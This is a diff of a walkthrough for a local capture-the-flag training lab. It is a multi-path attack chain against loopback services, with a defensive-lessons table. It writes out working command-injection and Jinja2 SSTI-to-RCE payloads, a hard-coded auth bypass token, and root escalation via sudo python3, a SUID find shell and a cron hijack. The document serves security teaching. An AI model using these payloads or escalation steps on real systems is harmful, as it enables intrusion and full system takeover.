@@ -1,4 +1,4 @@
-# Scenario 01 — Full Attack Chain
+# Scenario 01 — Full Attack Chain (Multi-Path)
 
 **Difficulty:** Beginner–Intermediate  
 **Time estimate:** 60–120 minutes  
@@ -8,24 +8,24 @@
 
 ## Objective
 
-Work through a complete end-to-end attack chain against the local lab environment. Starting from no knowledge beyond knowing the lab is running, reach root on the privilege escalation target and capture all four flags.
+Work through a complete end-to-end attack chain against the local lab. Multiple valid paths exist at each stage — choose your own route. All four flags are reachable; the order in which you collect FLAGS 2 and 3 depends on which lateral movement path you take.
 
-| Flag | Location | Skill |
-|------|----------|-------|
+| Flag | Location | Skills |
+|------|----------|--------|
 | `FLAG{enum_the_web}` | Web app `/flag` | Web enumeration |
-| `FLAG{lateral_move_success}` | Internal API `/secret` | Lateral movement |
-| `FLAG{db_creds_found}` | PostgreSQL `flags` table | Credential reuse / DB access |
+| `FLAG{lateral_move_success}` | Internal API `/secret` | Lateral movement via RCE |
+| `FLAG{db_creds_found}` | PostgreSQL `flags` table | Credential reuse, DB access |
 | `FLAG{root_privesc_complete}` | `/root/flag.txt` on privesc host | Linux privilege escalation |
 
 ---
 
 ## Scope and Safety Boundary
 
-**In scope:** All services listed in this document. All actions must stay local to your workstation.
+**In scope:** All services listed below. All actions must stay local to your workstation.
 
-**Out of scope:** Your host OS beyond the lab ports listed below. Any network interface other than loopback. Any real credentials, real hosts, or any internet connectivity.
+**Out of scope:** Your host OS beyond the lab ports listed. Any network interface other than loopback. Any real credentials, real hosts, or internet connectivity.
 
-**Do not:** run active scans against any IP other than `127.0.0.1`. Do not push exploits, payloads, or lab changes to public repositories.
+**Do not** run active scans beyond `127.0.0.1`. Do not push exploits, payloads, or lab changes to public repositories.
 
 ---
 
@@ -38,233 +38,376 @@ make up
 make verify   # all checks green before starting
 ```
 
-Required tools (available in most pen-test distros or via Homebrew/apt):
-
-- `curl`
-- `nmap` or `nc`
-- `ssh`
+Required tools: `curl`, `nmap` or `nc`, `ssh`
 
 ---
 
 ## Target Services
 
-| Service | Host:Port | Access |
-|---------|-----------|--------|
-| Web app | `127.0.0.1:8080` | Direct from your host |
-| Internal API | `forge-internal:9090` | Reachable from within `forge-web` container only |
-| Database | `forge-db:5432` | Reachable from within `forge-internal` container only |
-| Privesc host (SSH) | `127.0.0.1:2222` | Direct SSH from your host |
+| Service | Host:Port | Accessible From |
+|---------|-----------|----------------|
+| Web app | `127.0.0.1:8080` | Host (direct) |
+| Internal API | `forge-internal:9090` | Inside `forge-web` container only |
+| Database | `forge-db:5432` | Inside `forge-internal` or `forge-privesc` |
+| Privesc host (SSH) | `127.0.0.1:2222` | Host (direct) |
 
 ---
 
-## Skills Practiced
+## Path Overview
 
-- HTTP enumeration (robots.txt, directory guessing)
-- OS command injection via unsanitized shell execution
-- Server-side template injection (SSTI) via Jinja2
-- Credential discovery in exposed configuration endpoints
-- Container-to-container lateral movement using HTTP
-- Broken access control on internal APIs
-- SSH login and session establishment
-- Linux privilege escalation via:
-  - `sudo NOPASSWD` misconfiguration
-  - SUID binary abuse
-  - World-writable cron job hijacking
+Each stage offers two valid approaches. Mix and match freely.
+
+| Stage | Path A | Path B |
+|-------|--------|--------|
+| 0 — Enumeration | Port scan + robots.txt | Manual browsing |
+| 1 — Foothold | OS command injection (`/ping`) | SSTI (`/greet`) |
+| 2 — Credentials | Admin panel (`/admin`) | Backup endpoint (`/backup`) |
+| 3 — Lateral Movement | Web RCE → Internal API → FLAG 2 | SSH → privesc host → DB → FLAG 3 |
+| 4 — PrivEsc | sudo python3 / SUID find_lab / cron hijack (choose any) |
 
 ---
 
-## Starting Conditions
+## Stage 0 — Enumeration
 
-- The lab is up and all containers are healthy (`make verify` passes).
-- You have no credentials, no session cookies, and no prior knowledge beyond the fact that the lab is running.
-- Your only initial access point is `http://127.0.0.1:8080`.
+### Objective
 
----
+Identify all reachable services and enumerate interesting endpoints before attempting exploitation.
 
-## Phase 1 — Enumeration
+### Approaches
+
+**Path A — Active scan:**
+```bash
+nmap -sV -p 8080,2222 127.0.0.1
+curl -s http://127.0.0.1:8080/robots.txt
+```
+
+**Path B — Manual browsing:**
+Browse `http://127.0.0.1:8080` directly. The homepage exposes two interactive forms. Check common web paths: `/robots.txt`, `/admin`, `/backup`, `/flag`.
 
 ### Hints
 
-- Start by browsing the web app manually. What does it expose?
-- Check `robots.txt`. Web servers often advertise paths they want crawlers to avoid.
-- Look for hidden or undocumented endpoints. The web app has several beyond the homepage.
-- Use `nmap` or `nc` to scan `127.0.0.1` for open ports before diving into the web app.
+<details>
+<summary>Hint 1 (mild)</summary>
+Two ports are exposed on `127.0.0.1`. One is a web app; the other is a remote login service.
+</details>
 
-### Expected findings
+<details>
+<summary>Hint 2 (direct)</summary>
 
-- Port 8080: web application
-- Port 2222: SSH service
-- `/robots.txt` with `Disallow` entries pointing to interesting paths
-- Multiple functional endpoints on the web app
+`/robots.txt` on the web app points to paths the developer wanted crawlers to skip — but that you should request manually.
+</details>
 
----
+### Expected Evidence
 
-## Phase 2 — Credential Discovery
-
-### Hints
-
-- The paths mentioned in `robots.txt` are worth requesting directly.
-- Configuration backups and admin panels are common sources of credentials in real engagements.
-- Look for database connection strings, service tokens, and SSH credentials.
-- Write down every credential you find — you will need them later.
-
-### Expected findings
-
-- `/backup`: exposes a database connection URL with username and password
-- `/admin`: exposes an internal service registry containing credentials for all lab services
+- Port `8080`: web application with Ping and Greet forms
+- Port `2222`: SSH service
+- `/robots.txt` listing `Disallow: /admin` and `Disallow: /backup`
 
 ---
 
-## Phase 3 — Web Exploitation
+## Stage 1 — Initial Foothold
 
-### Hints
+### Objective
 
-- The homepage has two interactive forms. Try both.
-- The ping utility accepts arbitrary input. What happens if you add shell metacharacters?
-- The greet form reflects your input in the page. What template engine does Flask use by default?
-- For command injection, try: `;id`, `$(id)`, or `|id` appended to the hostname field.
-- For SSTI, try: `{{7*7}}` in the name field. If the page returns `49`, the template is evaluated.
+Obtain code execution inside the `forge-web` container. Either path yields equivalent access.
 
-### Expected findings
+### Path A — OS Command Injection (`/ping`)
 
-- OS command injection at `POST /ping` — the `host` parameter is passed directly to a shell.
-- Server-side template injection at `GET /greet` — the `name` parameter is evaluated as a Jinja2 template.
-- Either vulnerability gives arbitrary code execution within the `forge-web` container.
+The `host` field in the Ping form is passed directly to a shell command. Shell metacharacters execute additional commands.
+
+**Test for injection:**
+```bash
+curl -X POST http://127.0.0.1:8080/ping -d "host=127.0.0.1;id"
+```
+If the response contains `uid=`, you have command execution inside the container.
+
+<details>
+<summary>Hint A1 (mild)</summary>
+Shell metacharacters like `;`, `|`, and `$()` chain commands. Append one after a valid hostname.
+</details>
+<details>
+<summary>Hint A2 (direct)</summary>
+
+```bash
+curl -X POST http://127.0.0.1:8080/ping -d "host=127.0.0.1;id"
+# Expected: uid=0(root) gid=0(root) groups=0(root)
+```
+</details>
+
+### Path B — Server-Side Template Injection (`/greet`)
+
+The `name` query parameter is inserted directly into a Jinja2 template string and evaluated server-side. Mathematical expressions in `{{ }}` are executed.
+
+**Test for SSTI:**
+```bash
+curl "http://127.0.0.1:8080/greet?name={{7*7}}"
+```
+If the page returns `Hello, 49!`, the template engine is evaluating your input.
+
+<details>
+<summary>Hint B1 (mild)</summary>
+Flask uses the Jinja2 template engine. Jinja2 evaluates `{{ expression }}` on the server. A multiplication expression like `7*7` lets you confirm evaluation vs. reflection.
+</details>
+<details>
+<summary>Hint B2 (stronger)</summary>
+Confirmed SSTI — now escalate to RCE. Jinja2 exposes Python internals through the `config` object. Research the `__class__.__init__.__globals__` chain to reach `os.popen`.
+</details>
+<details>
+<summary>Hint B3 (direct)</summary>
+
+```bash
+curl -g "http://127.0.0.1:8080/greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+# Expected: uid=0(root) gid=0(root) groups=0(root)
+```
+</details>
 
 ### FLAG 1
 
+```bash
+curl -s http://127.0.0.1:8080/flag
+# → FLAG{enum_the_web}
 ```
-GET http://127.0.0.1:8080/flag
-→ FLAG{enum_the_web}
-```
+
+### Expected Evidence
+
+- `id` or `whoami` output showing process identity inside the container
+- `FLAG{enum_the_web}` retrieved from `/flag`
 
 ---
 
-## Phase 4 — Lateral Movement to Internal API
+## Stage 2 — Credential Discovery
 
-### Hints
+### Objective
 
-- From within the `forge-web` container, what other services are reachable?
-- The internal API runs on `forge-internal` at port `9090`. It is not directly accessible from your host.
-- Use the command injection in `/ping` to make HTTP requests from inside the container.
-- The internal API has a `/secret` endpoint. Check what authentication it requires.
-- There is a well-known bypass value for the `X-Internal-Token` header.
+Collect credentials that enable lateral movement and privilege escalation in later stages. Write down everything you find.
 
-### Expected findings
+### Path A — Unauthenticated Admin Panel (`/admin`)
 
-- `forge-internal:9090/health` is reachable from within `forge-web`.
-- `forge-internal:9090/secret` with header `X-Internal-Token: lab-bypass` returns the flag and secret key.
+The `/admin` endpoint exposes the internal service registry with no authentication required.
 
-### FLAG 2
-
-Using command injection from `/ping`:
-
-```
-host: forge-internal:9090/secret -H "X-Internal-Token: lab-bypass" #
+```bash
+curl -s http://127.0.0.1:8080/admin
 ```
 
-Or using docker exec for verification:
+**What you get:**
+- Internal API host, port, and service token (`internal_lab_secret_do_not_reuse`)
+- Database: host `forge-db`, user `app`, password `SuperSecret1!`
+- SSH credentials: user `labuser`, password `labpassword` (for `forge-privesc`)
 
+<details>
+<summary>Hint A1</summary>
+`/robots.txt` listed `/admin`. Request it directly — no credentials are required.
+</details>
+
+### Path B — Exposed Backup Configuration (`/backup`)
+
+The `/backup` endpoint returns the database connection URL used by the web application.
+
+```bash
+curl -s http://127.0.0.1:8080/backup
+# → # backup config
+# → DB_URL=postgres://app:SuperSecret1!@db/appdb
+```
+
+**What you get:**
+- Database credentials: user `app`, password `SuperSecret1!`
+
+<details>
+<summary>Hint B1</summary>
+`/robots.txt` listed `/backup`. The response is a connection string — parse out the username and password.
+</details>
+
+### Which path to choose?
+
+- **Path A** gives SSH creds, DB creds, and the internal API token in one request. Use it if you want the fastest route to all four flags.
+- **Path B** gives DB credentials only. Sufficient for Stage 3 Path B, but you will still need `/admin` to get SSH credentials before Stage 4.
+
+### Expected Evidence
+
+From Path A: `labuser:labpassword`, `app:SuperSecret1!`, `internal_lab_secret_do_not_reuse`
+
+From Path B: `app:SuperSecret1!` (from the DB_URL connection string)
+
+---
+
+## Stage 3 — Lateral Movement
+
+### Objective
+
+Move beyond the `forge-web` container to reach internal services. Both paths are valid; they yield different flags.
+
+---
+
+### Path A — Web RCE to Internal API
+
+**Requires:** Foothold in `forge-web` (Stage 1, either path)
+
+The internal API (`forge-internal:9090`) is not directly reachable from your host — only containers on `public_net` can reach it. Use your RCE inside `forge-web` to proxy requests.
+
+**Via command injection:**
+```bash
+curl -X POST http://127.0.0.1:8080/ping \
+  -d 'host=forge-internal:9090/secret -H "X-Internal-Token: lab-bypass" #'
+```
+
+**Verification via docker exec:**
 ```bash
 docker exec forge-web curl -s http://forge-internal:9090/secret \
   -H "X-Internal-Token: lab-bypass"
-→ {"flag": "FLAG{lateral_move_success}", "secret_key": "internal_lab_secret_do_not_reuse"}
+# → {"flag": "FLAG{lateral_move_success}", "secret_key": "internal_lab_secret_do_not_reuse"}
+```
+
+<details>
+<summary>Hint A1 (mild)</summary>
+From inside `forge-web`, `forge-internal` resolves as a hostname. First confirm reachability:
+
+```bash
+curl -X POST http://127.0.0.1:8080/ping -d "host=forge-internal:9090/health #"
+```
+</details>
+<details>
+<summary>Hint A2 (stronger)</summary>
+The `/secret` endpoint checks the `X-Internal-Token` header. The value `lab-bypass` is a hard-coded fallback in the source code. Use curl's `-H` flag in your injected command.
+</details>
+<details>
+<summary>Hint A3 (direct)</summary>
+
+The `#` at the end of the injected host value comments out the rest of the shell command that `ping` appends, so the curl runs cleanly:
+
+```
+host = forge-internal:9090/secret -H "X-Internal-Token: lab-bypass" #
+```
+Shell sees: `ping -c 2 forge-internal:9090/secret -H "X-Internal-Token: lab-bypass" #-c 2 127.0.0.1`
+→ `ping` fails immediately, but the `#` causes the rest to be ignored.
+
+Alternatively, use `;curl ...` to make it explicit:
+```
+host = 127.0.0.1 ; curl -s http://forge-internal:9090/secret -H "X-Internal-Token: lab-bypass"
+```
+</details>
+
+### FLAG 2
+
+```
+FLAG{lateral_move_success}
 ```
 
 ---
 
-## Phase 5 — Database Access
+### Path B — SSH to Privesc Host, then psql to Database
 
-### Hints
+**Requires:** SSH credentials (`labuser:labpassword` from `/admin`) and DB credentials (`app:SuperSecret1!` from `/admin` or `/backup`)
 
-- You have database credentials from `/backup`. Can you reach the database from anywhere?
-- The internal service is on the same network as the database. Use command injection on the web app to reach the internal service, then from there query the database.
-- Alternatively, if you found SSH access: once on the privesc host (internal network), can you reach the database from there?
-- PostgreSQL default port is `5432`. The database name is `appdb`.
+`forge-privesc` is dual-homed: it is on both `public_net` (enabling the published SSH port) and `internal_net` (giving it a route to `forge-db`). Once you SSH in, you can reach the database directly.
 
-### Expected findings
-
-- The `flags` table in `appdb` contains `FLAG{db_creds_found}`.
-- The `users` table contains plaintext credentials for multiple accounts.
-
-### FLAG 3
-
-From within a container that can reach `forge-db` (e.g., `forge-internal`):
-
-```bash
-docker exec forge-internal python3 -c "
-import subprocess
-result = subprocess.check_output(
-    ['python3', '-c',
-     '''import subprocess; r=subprocess.check_output([\"psql\",\"-h\",\"forge-db\",\"-U\",\"app\",\"-d\",\"appdb\",\"-c\",\"SELECT value FROM flags;\"], env={\"PGPASSWORD\":\"SuperSecret1!\"}, capture_output=False); print(r)'''],
-    shell=False
-)
-"
-```
-
-Or from your host using the docker exec shortcut:
-
-```bash
-docker exec forge-db psql -U app -d appdb -c "SELECT value FROM flags;"
-→ FLAG{db_creds_found}
-```
-
----
-
-## Phase 6 — Privilege Escalation Host — SSH Access
-
-### Hints
-
-- You found SSH credentials in `/admin`. The privesc host is reachable at `127.0.0.1:2222`.
-- SSH in as the low-privilege lab user using the credentials from the service registry.
-- Once in, run `sudo -l` to see what you can do without a password.
-- Also check for SUID binaries and writable cron jobs.
-
-### Login
-
+**Step 1 — SSH in:**
 ```bash
 ssh labuser@127.0.0.1 -p 2222
 # password: labpassword
 ```
 
+**Step 2 — Connect to the database from inside forge-privesc:**
+```bash
+PGPASSWORD=SuperSecret1! psql -h forge-db -U app -d appdb -c "SELECT value FROM flags;"
+# → FLAG{db_creds_found}
+```
+
+<details>
+<summary>Hint B1 (mild)</summary>
+`forge-privesc` sits on the internal network alongside `forge-db`. After SSH-ing in, confirm the database port is reachable:
+
+```bash
+nc -z forge-db 5432 && echo "open"
+```
+</details>
+<details>
+<summary>Hint B2 (direct)</summary>
+
+```bash
+PGPASSWORD=SuperSecret1! psql -h forge-db -U app -d appdb -c "SELECT value FROM flags;"
+```
+
+The password comes from the `/backup` endpoint or the `/admin` service registry.
+</details>
+
+### FLAG 3
+
+```
+FLAG{db_creds_found}
+```
+
+### Expected Evidence
+
+- PATH A: JSON response from `/secret` containing `FLAG{lateral_move_success}`
+- PATH B: psql output from `appdb.flags` table containing `FLAG{db_creds_found}`
+
 ---
 
-## Phase 7 — Privilege Escalation
+## Stage 4 — Privilege Escalation
 
-### Hints
+### Objective
 
-- `sudo -l` shows what commands `labuser` can run as root without a password. Is any of them dangerous?
-- `find / -perm -4000 2>/dev/null` lists SUID binaries. Look for anything unusual.
-- `ls -la /etc/cron.d/` and `ls -la /opt/` — are any cron scripts world-writable?
-- GTFOBins (https://gtfobins.github.io) lists known privilege escalation techniques for common binaries.
+Escalate from `labuser` to `root` on `forge-privesc` and read `/root/flag.txt`. Three independent methods exist — choose any one.
 
-### Method 1 — sudo python3 (fastest)
+### Setup
+
+If not already logged in (Stage 3 Path B puts you here):
+```bash
+ssh labuser@127.0.0.1 -p 2222   # password: labpassword
+```
+
+**Always enumerate first:**
+```bash
+sudo -l                           # what can labuser run as root?
+find / -perm -4000 2>/dev/null    # SUID binaries
+ls -la /etc/cron.d/ /opt/         # cron jobs and writable scripts
+```
+
+---
+
+### Method 1 — sudo python3
+
+**Hint:** `sudo -l` shows `labuser` can run `/usr/bin/python3` as root with no password. Python can replace the current process with a shell.
 
 ```bash
 sudo python3 -c 'import os; os.execl("/bin/bash", "bash")'
-# You are now root
+# Prompt changes to root (#)
 cat /root/flag.txt
 ```
 
-### Method 2 — SUID find_lab binary
+**Expected result:** Shell with `uid=0(root)`, flag readable at `/root/flag.txt`.
+
+---
+
+### Method 2 — SUID find_lab Binary
+
+**Hint:** `/usr/local/bin/find_lab` is a copy of `find` with the SUID bit set. GTFOBins documents how `find -exec` can spawn a privileged shell.
 
 ```bash
 /usr/local/bin/find_lab /root -exec /bin/bash -p \; -quit
-# You are now root
+# euid=0(root) in id output
 cat /root/flag.txt
 ```
 
-### Method 3 — World-writable cron job hijack
+**Expected result:** Effective UID `euid=0`, flag readable.
+
+---
+
+### Method 3 — World-Writable Cron Job Hijack
+
+**Hint:** `/opt/cleanup.sh` runs every minute as root and has permissions `777`. Overwrite it to copy bash with a SUID bit, then execute the copy.
 
 ```bash
-# /opt/cleanup.sh runs every minute as root and is world-writable
 echo '#!/bin/bash' > /opt/cleanup.sh
 echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/cleanup.sh
-# Wait up to 60 seconds for the cron job to execute
+# Wait up to 60 seconds for cron to fire, then:
 /tmp/rootbash -p
-# You are now root (euid=0)
 /tmp/rootbash -p -c "cat /root/flag.txt"
 ```
+
+**Expected result:** `/tmp/rootbash` exists with SUID set, `id` shows `euid=0`, flag readable.
+
+---
 
 ### FLAG 4
 
@@ -274,49 +417,119 @@ FLAG{root_privesc_complete}
 
 ---
 
-## Walkthrough (Full Answer Key)
+## Flags & Validation
+
+All four flags, collectable in any order:
+
+```
+FLAG{enum_the_web}           — Stage 1 (/flag endpoint on web app)
+FLAG{lateral_move_success}   — Stage 3 Path A (internal API /secret)
+FLAG{db_creds_found}         — Stage 3 Path B (PostgreSQL flags table)
+FLAG{root_privesc_complete}  — Stage 4 (/root/flag.txt on forge-privesc)
+```
+
+Run `make verify` to confirm the lab is in a clean state before and after each attempt.
+
+---
+
+## Walkthrough (Open Only If Stuck)
 
 <details>
-<summary>Expand only after attempting with hints above</summary>
+<summary>Full answer key — expand only after attempting with the hints above</summary>
 
-### Complete command sequence
+### Route 1 — Command Injection + Admin Panel → Internal API + DB → sudo privesc
 
 ```bash
-# Phase 1: Enumeration
+# Stage 0: Enumeration
 nmap -sV -p 8080,2222 127.0.0.1
 curl -s http://127.0.0.1:8080/robots.txt
 
-# Phase 2: Credential Discovery
-curl -s http://127.0.0.1:8080/backup
-# → DB_URL=postgres://app:SuperSecret1!@db/appdb
+# Stage 1: Foothold via command injection
+curl -X POST http://127.0.0.1:8080/ping -d "host=127.0.0.1;id"
+# → uid=0(root)
 
-curl -s http://127.0.0.1:8080/admin
-# → service registry with labuser:labpassword for SSH
-
-# Phase 3: FLAG 1
+# Stage 1: FLAG 1
 curl -s http://127.0.0.1:8080/flag
 # → FLAG{enum_the_web}
 
-# Phase 4: Command injection confirmation
-curl -s -X POST http://127.0.0.1:8080/ping -d "host=127.0.0.1;id"
-# → uid=0(root) — running as root inside the container
+# Stage 2: All credentials from admin panel
+curl -s http://127.0.0.1:8080/admin
+# → labuser:labpassword (SSH), app:SuperSecret1! (DB), internal_lab_secret_do_not_reuse (API token)
 
-# Phase 4: FLAG 2 via lateral movement
-curl -s -X POST http://127.0.0.1:8080/ping \
-  -d 'host=forge-internal:9090/secret -H "X-Internal-Token: lab-bypass" #'
-# or directly:
-docker exec forge-web curl -s http://forge-internal:9090/secret \
-  -H "X-Internal-Token: lab-bypass"
-# → FLAG{lateral_move_success}
+# Stage 3 Path A: Lateral to internal API via command injection
+curl -X POST http://127.0.0.1:8080/ping \
+  -d 'host=127.0.0.1 ; curl -s http://forge-internal:9090/secret -H "X-Internal-Token: lab-bypass"'
+# → {"flag": "FLAG{lateral_move_success}", ...}
 
-# Phase 5: FLAG 3 via database
-docker exec forge-db psql -U app -d appdb -c "SELECT value FROM flags;"
+# Stage 3 Path B: SSH → forge-privesc → psql → forge-db
+ssh labuser@127.0.0.1 -p 2222   # password: labpassword
+PGPASSWORD=SuperSecret1! psql -h forge-db -U app -d appdb -c "SELECT value FROM flags;"
 # → FLAG{db_creds_found}
 
-# Phase 6 + 7: SSH in and escalate
-ssh labuser@127.0.0.1 -p 2222   # password: labpassword
+# Stage 4: Privesc via sudo python3
 sudo python3 -c 'import os; os.execl("/bin/bash", "bash")'
 cat /root/flag.txt
+# → FLAG{root_privesc_complete}
+```
+
+### Route 2 — SSTI + Backup Endpoint → Internal API → SUID privesc
+
+```bash
+# Stage 1: Confirm SSTI
+curl "http://127.0.0.1:8080/greet?name={{7*7}}"
+# → Hello, 49!
+
+# Stage 1: RCE via SSTI
+curl -g "http://127.0.0.1:8080/greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
+# → uid=0(root)
+
+# Stage 1: FLAG 1
+curl -s http://127.0.0.1:8080/flag
+# → FLAG{enum_the_web}
+
+# Stage 2: DB creds from backup endpoint
+curl -s http://127.0.0.1:8080/backup
+# → DB_URL=postgres://app:SuperSecret1!@db/appdb
+
+# Stage 2: SSH creds (still needed for Stage 4)
+curl -s http://127.0.0.1:8080/admin
+# → labuser:labpassword
+
+# Stage 3 Path A: Lateral via SSTI RCE
+curl -g "http://127.0.0.1:8080/greet?name={{config.__class__.__init__.__globals__['os'].popen('curl%20-s%20http://forge-internal:9090/secret%20-H%20X-Internal-Token:%20lab-bypass').read()}}"
+# → {"flag": "FLAG{lateral_move_success}", ...}
+
+# Stage 4: Privesc via SUID binary
+ssh labuser@127.0.0.1 -p 2222   # password: labpassword
+/usr/local/bin/find_lab /root -exec /bin/bash -p \; -quit
+cat /root/flag.txt
+# → FLAG{root_privesc_complete}
+```
+
+### Route 3 — Command Injection + Backup Endpoint → DB via SSH → Cron privesc
+
+```bash
+# Stage 1: Foothold via command injection
+curl -X POST http://127.0.0.1:8080/ping -d "host=127.0.0.1;id"
+
+# Stage 1: FLAG 1
+curl -s http://127.0.0.1:8080/flag
+
+# Stage 2 Path B: DB creds only from /backup
+curl -s http://127.0.0.1:8080/backup
+# Stage 2 Path A: SSH creds from /admin (needed for Stage 3B + Stage 4)
+curl -s http://127.0.0.1:8080/admin
+
+# Stage 3 Path B: SSH → psql → DB flag
+ssh labuser@127.0.0.1 -p 2222   # password: labpassword
+PGPASSWORD=SuperSecret1! psql -h forge-db -U app -d appdb -c "SELECT value FROM flags;"
+# → FLAG{db_creds_found}
+
+# Stage 4: Privesc via cron hijack
+echo '#!/bin/bash' > /opt/cleanup.sh
+echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' >> /opt/cleanup.sh
+# wait up to 60s for cron
+/tmp/rootbash -p -c "cat /root/flag.txt"
 # → FLAG{root_privesc_complete}
 ```
 
@@ -324,16 +537,20 @@ cat /root/flag.txt
 
 ---
 
-## Expected Evidence of Completion
+## Defensive Lessons
 
-Screenshot or copy-paste showing all four flags:
-
-```
-FLAG{enum_the_web}
-FLAG{lateral_move_success}
-FLAG{db_creds_found}
-FLAG{root_privesc_complete}
-```
+| Vulnerability | Root Cause | Correct Fix |
+|---------------|-----------|-------------|
+| OS command injection (`/ping`) | `shell=True` with unsanitized input | Use `subprocess.run([...], shell=False)` with an argument list |
+| SSTI (`/greet`) | User input passed directly to `render_template_string` | Treat user input as data; use `render_template` with static templates |
+| Unauthenticated admin panel (`/admin`) | No access control | Require authentication; never expose service registries via HTTP |
+| Credential leak in backup endpoint (`/backup`) | Sensitive data in unauthenticated HTTP response | Serve config from environment/secrets manager; require authentication |
+| Hard-coded bypass token (`/secret`) | `token == "lab-bypass"` fallback in source | Use environment-injected secrets with no hard-coded fallback |
+| Plaintext DB passwords | Missing password hashing | Use `bcrypt`/`scrypt`; never store or transmit plaintext passwords |
+| `sudo NOPASSWD: /usr/bin/python3` | Overly permissive sudoers | Restrict `sudo` to specific, purpose-built scripts; never allow interactive interpreters |
+| SUID on `find_lab` | Unnecessary SUID on a general-purpose binary | Audit SUID binaries; remove SUID from anything that can execute arbitrary code |
+| World-writable cron script | Incorrect file permissions | Cron scripts must be owned by root, mode `700` or `755` |
+| Credential reuse across services | Poor password hygiene | Use unique credentials per service; rotate on schedule |
 
 ---
 
@@ -351,19 +568,3 @@ For a full teardown including the optional kind cluster:
 ```bash
 make reset-all
 ```
-
----
-
-## Defensive Lessons
-
-| Vulnerability | Root Cause | Fix |
-|---------------|-----------|-----|
-| OS command injection (`/ping`) | `shell=True` with unsanitized input | Use `subprocess.run([...], shell=False)` with a list of arguments |
-| SSTI (`/greet`) | User input passed to `render_template_string` | Treat user input as data, not as template text; use `render_template` with static templates |
-| Exposed configuration (`/backup`, `/admin`) | No authentication; sensitive data in HTTP responses | Require authentication; never expose connection strings in responses |
-| Broken internal API auth (`/secret`) | Hard-coded bypass token in source code | Use environment-injected secrets; no hardcoded fallback values |
-| Plaintext DB passwords | Missing encryption | Use `scrypt`/`bcrypt` for passwords; never store plaintext |
-| `sudo NOPASSWD: /usr/bin/python3` | Overly permissive sudoers | Restrict `sudo` to specific scripts that do exactly one thing; never allow interactive interpreters |
-| SUID on `find_lab` | Unnecessary SUID on a general-purpose binary | Audit SUID binaries regularly; remove SUID from anything that can execute arbitrary code |
-| World-writable cron script | Incorrect file permissions | Cron scripts must be owned by root and mode `700` or `755`, never `777` |
-| Credential reuse across services | Password hygiene failure | Use unique credentials per service; rotate on schedule |
